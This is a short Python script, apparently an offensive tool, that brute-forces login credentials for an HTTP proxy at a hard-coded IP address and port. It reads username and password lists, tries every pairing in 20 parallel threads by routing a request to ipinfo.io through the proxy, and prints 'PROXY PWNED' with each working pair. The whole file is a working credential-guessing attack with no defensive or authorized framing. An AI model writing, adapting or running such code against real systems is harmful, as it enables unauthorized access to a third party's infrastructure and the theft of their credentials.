import requests
from requests.auth import HTTPBasicAuth
import concurrent.futures
import sys

PROXY_HOST = "46.183.184.147"
PROXY_PORT = 3128
TARGET_TEST = "http://ipinfo.io/ip"

def check_auth(creds):
    user, password = creds
    proxies = {
        "http": f"http://{user}:{password}@{PROXY_HOST}:{PROXY_PORT}",
        "https": f"http://{user}:{password}@{PROXY_HOST}:{PROXY_PORT}",
    }
    try:
        r = requests.get(TARGET_TEST, proxies=proxies, timeout=5)
        if r.status_code == 200:
            print(f"\n[!!!] PROXY PWNED: {user}:{password}")
            return True
    except:
        sys.stdout.write(".")
        sys.stdout.flush()
    return False

def run():
    print(f"[*] Brute-forcing Proxy {PROXY_HOST}:{PROXY_PORT}...")
    with open("paragon_usernames.txt", "r") as f:
        users = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    with open("paragon_passwords.txt", "r") as f:
        passwords = [l.strip() for l in f if l.strip() and not l.startswith("#")]
    
    combos = [(u, p) for u in users for p in passwords]
    print(f"[*] Testing {len(combos)} combinations...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        list(executor.map(check_auth, combos))
    print("\n[*] Brute-force complete.")

if __name__ == "__main__":
    run()
